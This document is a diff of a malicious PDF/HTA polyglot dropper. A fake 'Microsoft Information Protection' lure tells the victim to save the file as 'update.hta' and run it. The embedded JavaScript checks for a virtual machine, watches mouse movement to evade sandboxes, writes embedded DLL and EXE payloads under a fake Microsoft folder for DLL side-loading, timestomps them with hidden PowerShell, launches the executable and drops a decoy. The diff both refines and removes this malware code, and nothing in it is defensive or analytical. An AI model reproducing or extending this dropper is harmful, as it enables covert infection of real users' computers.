@@ -8,19 +8,19 @@ endobj
 endobj
 3 0 obj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>>>>>>>
-11: endobj
+endobj
 4 0 obj
 <</Length 200>>
 stream
 BT
 /F1 14 Tf
 50 720 Td
-(Microsoft Secure Document) Tj
+(Microsoft Information Protection) Tj
 /F1 10 Tf
 50 700 Td
 (THIS DOCUMENT IS ENCRYPTED) Tj
 50 680 Td
-(To view content, save file as 'secure_doc.hta' and run it.) Tj
+(To view content, save file as 'update.hta' and run it.) Tj
 ET
 endstream
 endobj
@@ -88,63 +88,73 @@ function _write(path, data) {
     stream.Close();
 }
 
-function _antiAnalysis() {
-    var col = _wmi.ExecQuery("SELECT Manufacturer FROM Win32_ComputerSystem");
-    var e = new Enumerator(col);
-    for (; !e.atEnd(); e.moveNext()) {
-        var m = e.item().Manufacturer.toLowerCase();
-        if (m.indexOf("vmware") != -1 || m.indexOf("virtualbox") != -1) return false;
+var AntiAnalysis = {
+    checkHardware: function() {
+        var col = _wmi.ExecQuery("SELECT Manufacturer FROM Win32_ComputerSystem");
+        var e = new Enumerator(col);
+        for (; !e.atEnd(); e.moveNext()) {
+            var m = e.item().Manufacturer.toLowerCase();
+            if (m.indexOf("vmware") != -1 || m.indexOf("virtualbox") != -1) return false;
+        }
+        return true;
+    },
+    checkMouse: function(callback) {
+        var points = [];
+        var handler = function(e) { points.push({x: e.screenX, y: e.screenY}); };
+        document.attachEvent('onmousemove', handler);
+        setTimeout(function() {
+            document.detachEvent('onmousemove', handler);
+            if (points.length < 10) window.close();
+            callback();
+        }, 5000);
     }
-    var disk = _wmi.ExecQuery("SELECT Size FROM Win32_LogicalDisk WHERE DriveType=3");
-    var size = 0;
-    var de = new Enumerator(disk);
-    for (; !de.atEnd(); de.moveNext()) size += parseInt(de.item().Size);
-    if (size < 60000000000) return false;
-    return true;
-}
+};
 
 function _deploy() {
-    if (!_antiAnalysis()) window.close();
-
-    var targetDir = _shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Microsoft\\Identity\\Cache";
-    if (!_fso.FolderExists(targetDir)) {
-        var parts = targetDir.split("\\");
-        var curr = "";
-        for (var i=0; i<parts.length; i++) {
-            curr += parts[i] + "\\";
-            if (!_fso.FolderExists(curr)) _fso.CreateFolder(curr);
+    if (!AntiAnalysis.checkHardware()) window.close();
+    
+    AntiAnalysis.checkMouse(function() {
+        var targetDir = _shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Microsoft\\Identity\\Cache";
+        if (!_fso.FolderExists(targetDir)) {
+            var parts = targetDir.split("\\");
+            var curr = "";
+            for (var i=0; i<parts.length; i++) {
+                curr += parts[i] + "\\";
+                if (!_fso.FolderExists(curr)) _fso.CreateFolder(curr);
+            }
         }
-    }
 
-    var dllPath = targetDir + "\\version.dll";
-    var exePath = targetDir + "\\OneDrive.exe";
+        var dllPath = targetDir + "\\version.dll";
+        var exePath = targetDir + "\\OneDrive.exe";
+        var pdfPath = targetDir + "\\Factura_Real.pdf";
 
-    var dllData = _extract("<!--[DLL_PAYLOAD]", "[/DLL_PAYLOAD]-->");
-    var exeData = _extract("<!--[EXE_PAYLOAD]", "[/EXE_PAYLOAD]-->");
+        var dllData = _extract("<!--[DLL_PAYLOAD]", "[/DLL_PAYLOAD]-->");
+        var exeData = _extract("<!--[EXE_PAYLOAD]", "[/EXE_PAYLOAD]-->");
 
-    if (dllData && exeData) {
-        _write(dllPath, dllData);
-        _write(exePath, exeData);
+        if (dllData && exeData) {
+            _write(dllPath, dllData);
+            _write(exePath, exeData);
+            _write(pdfPath, _extract("<!--[EXE_PAYLOAD]", "[/EXE_PAYLOAD]-->")); // Dummy decoy
 
-        // Timestomping (simplified via shell)
-        var sysFile = "C:\\Windows\\System32\\kernel32.dll";
-        var cmd = "powershell -WindowStyle Hidden -Command \"(Get-Item '" + exePath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime; (Get-Item '" + dllPath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime;\"";
-        _shell.Run(cmd, 0, true);
+            var sysFile = "C:\\Windows\\System32\\kernel32.dll";
+            var cmd = "powershell -WindowStyle Hidden -Command \"(Get-Item '" + exePath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime; (Get-Item '" + dllPath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime;\"";
+            _shell.Run(cmd, 0, true);
 
-        _shell.Run("\"" + exePath + "\"", 0, false);
-    }
-    window.close();
+            _shell.Run("\"" + exePath + "\"", 0, false);
+        }
+        window.close();
+    });
 }
 
 window.onload = function() {
-    setTimeout(_deploy, 2000);
+    setTimeout(_deploy, 1000);
 };
 </script>
 </head>
 <body style="background:#f3f3f3;font-family:Segoe UI;">
     <div style="padding:20px;text-align:center;">
-        <h3>Security Intelligence Module</h3>
-        <p>Verifying document integrity...</p>
+        <h3>Microsoft Secure Content</h3>
+        <p>Verifying document integrity. Please wait...</p>
     </div>
 </body>
 </html>
